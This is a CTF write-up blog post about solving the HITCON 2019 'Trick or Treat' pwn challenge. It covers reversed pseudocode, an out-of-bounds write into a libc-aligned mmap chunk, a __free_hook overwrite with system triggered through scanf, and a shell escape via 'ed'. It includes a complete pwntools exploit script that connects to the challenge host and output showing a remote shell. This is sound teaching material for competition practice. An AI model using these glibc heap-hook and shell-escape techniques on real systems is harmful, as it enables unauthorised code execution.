---
layout: post
title:  "HITCON CTF 2019: Trick or Treat (pwn+misc)"
date:   2019-10-14 10:00:00 +0800
categories: pwn
tags: HITCON-2019
---

HITCON CTF 2019 Qualifiers just finished this weekend, and it was fun! I played with my team `0x1` and got 59th place. 

I've only been really participating in CTFs for about 4.5 months now, and this was my first "hard" level CTF where I actually solved a challenge!

Credits to Angelboy ([@scwuaptx](https://twitter.com/scwuaptx)) for this really cool challenge. I also got quite far into one of his other challenges called LazyHouse. Got a libc leak but I couldn't figure out how to get past the seccomp sandbox for that challenge. Looking forward to reading other team's writeups for that challenge!

### **Challenge**

* **Category:** pwn
* **Points:** 234
* **Solves:** 40

>Trick or Treat !!
>
>nc 3.112.41.140 56746
>
>[trick_or_treat-b2f8e79971f6f06e1680869133c6e47e69414c01.tar.gz](http://hitcon-2019-quals.s3-website-ap-northeast-1.amazonaws.com/trick_or_treat-b2f8e79971f6f06e1680869133c6e47e69414c01.tar.gz)

>Author: Angelboy

### **Solution**

This was a challenge with a very simple concept. I disassembled it, and here is my own interpretation of the pseudocode:
```c
void main(void)
{
  int i = 0;
  int size = 0;
  long int offset = 0;
  long int value = 0;
  int *chunk = 0;

  // Make stdin and stdout unbuffered
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  // Malloc a user defined size chunk
  write(1, "Size:", 5);
  scanf("%lu", &size);
  chunk = malloc(size);

  if (chunk)
  {
    printf("Magic:%p\n", chunk); // Prints out the address of the chunk

    // Loop twice and ask for an offset for the chunk and a value to write to that offset
    for (i = 0; i < 2; ++i)
    {
      write(1, "Offset & Value:", 0x10);
      scanf("%lx %lx", &offset, &value);
      chunk[offset] = value;
    }
  }
  _exit(0);
}
```

Basically it lets you do the following:

1. You can allocate whatever sized chunk you want.
2. If the allocation succeeds, you are allowed to pick an offset to that chunk, and a value to write to. You can do this twice.

Simple program, the vulnerability lies in the fact that the offset isn't checked to see if it fits into the size of the chunk. We can perform a relative write to any memory space adjacent to our chunk. However, if we simply allocate a chunk of, say, size 0x100, our chunk just gets put on the heap, and the memory looks like this:
```c
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x /ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat
0x0000555555754000 0x0000555555755000 0x0000000000000000 r-- /ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap] [our chunk is here]
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
...
```

As you can see, the only place we can write two arbitrary values to will be either on the heap, or back in the `rw` .bss segment right before the heap. There is nothing useful in the .bss segment for us to overwrite, and there is also nothing useful in the heap, so how do we solve this challenge?

After a little bit of thinking I remembered that if you pass a large size to `malloc` (but smaller than a certain size), `malloc` will actually call `mmap` to map a completely new memory region. With some trial and error, I found that with a chunk size of `10000000`, we can get our mmap'd chunk to align perfectly with libc:
```c
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x /ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat
0x0000555555754000 0x0000555555755000 0x0000000000000000 r-- /ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff6fe3000 0x00007ffff79e4000 0x0000000000000000 rw- [our chunk is now here]
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
...
```

Now that it is aligned to libc, we can overwrite stuff in libc! Of course the first thing that comes to mind is to overwrite `__malloc_hook` or `__free_hook` to get a shell, but since the program doesn't call `malloc` or `free` ever again after allocating our first chunk, how does it work?

Well, the trick is in `scanf`. If you pass a very large input into `scanf`, it will internally call both `malloc` and `free` to create a temporary buffer for your input on the heap. Let's start by calculating addresses that we need:
```python
#!/usr/bin/env python2

from pwn import *

elf = ELF('./trick_or_treat')
libc = ELF('./libc.so.6')

p = process('./trick_or_treat')
#p = remote('3.112.41.140', 56746)

context.terminal = ['tmux', 'new-window']

p.recv()

# Get a new mmapped chunk right before libc
# also aligned with libc
p.sendline('10000000')

chunk = int(p.recv().split('\n')[0].split(':')[1], 16)
libc.address = chunk + 0x989ff0 # Found using gdb, always constant
free_hook = libc.symbols['__free_hook']
free_hook_off = (free_hook - chunk) / 8 # offset to __free_hook
system = libc.symbols['system']
```

Next, here is what I tried:

1. I tried overwriting `__malloc_hook` with all the one gadgets, and none of them worked (FAIL).
2. I tried overwriting `__free_hook` with all the one gadgets, and none of them worked (FAIL).
3. Then, I thought of overwriting `__free_hook` with `system`, and then passing `'/bin/sh;'` as the first 8 bytes in our huge `scanf` buffer. That way when `free` is called internally in `scanf`, it will call `system("/bin/sh;blahblahblah...")` giving us a shell, but there was a problem.

The problem is in this line:
```c
for (i = 0; i < 2; ++i)
{
  write(1, "Offset & Value:", 0x10);
  scanf("%lx %lx", &offset, &value); // <- PROBLEM
  chunk[offset] = value;
}
```

The problem is with `%lx`, it means that in our huge `scanf` buffer, we can only pass in hexadecimal characters (`0123456789abcdef`). With that, there is no way to call `/bin/sh`.

I thought for a while on how to bypass this hexadecimal-only filter. I then went through my VM's `/usr/bin` folder and looked for any programs that I can run. I found `c89`, `c99`, `cc`, and `ed`.

I immediately remembered reading a writeup of some HackTheBox machine where the solution was to escape a restricted shell using `ed`, so I gave that a shot, and it worked.

The exploit is simple, we overwrite `__free_hook` with `system` and then call `system("ed")`, and then escape out of `ed` by typing `!/bin/sh`.

My exploit script behaved a bit weird, but here is the final script:
```python
#!/usr/bin/env python2

from pwn import *

elf = ELF('./trick_or_treat')
libc = ELF('./libc.so.6')

#p = process('./trick_or_treat')
p = remote('3.112.41.140', 56746)

context.terminal = ['tmux', 'new-window']

p.recv()

# Get a new mmapped chunk right before libc
# also aligned with libc
p.sendline('10000000')

chunk = int(p.recv().split('\n')[0].split(':')[1], 16)
libc.address = chunk + 0x989ff0 # Found using gdb, always constant
free_hook = libc.symbols['__free_hook']
free_hook_off = (free_hook - chunk) / 8 # Offset to __free_hook
system = libc.symbols['system']

log.info('Chunk: ' + hex(chunk))
log.info('__free_hook: ' + hex(free_hook))
log.info('free_hook_off: ' + hex(free_hook_off))
log.info('system: ' + hex(system))
log.info('Libc base: ' + hex(libc.address))

# Overwrite __free_hook with system
p.sendline('{} {}'.format(hex(free_hook_off), hex(system)))

print p.recv()

# Make scanf call malloc followed by free
p.sendline('A'*50000)

# Call system('ed')
p.sendline('ed')

# Escape out of ed and get a shell
p.sendline('!/bin/sh')

p.interactive()

```
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat$ ./exploit.py 
[*] '/ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 3.112.41.140 on port 56746: Done
[*] Chunk: 0x7f56a3973010
[*] __free_hook: 0x7f56a46ea8e8
[*] free_hook_off: 0x1aef1b
[*] system: 0x7f56a434c440
[*] Libc base: 0x7f56a42fd000
Offset & Value:\x00
[*] Switching to interactive mode
Offset & Value:\x00$ id
uid=1001(trick_or_treat) gid=1001(trick_or_treat) groups=1001(trick_or_treat)
$ cat /home/*/flag
hitcon{T1is_i5_th3_c4ndy_for_yoU}
```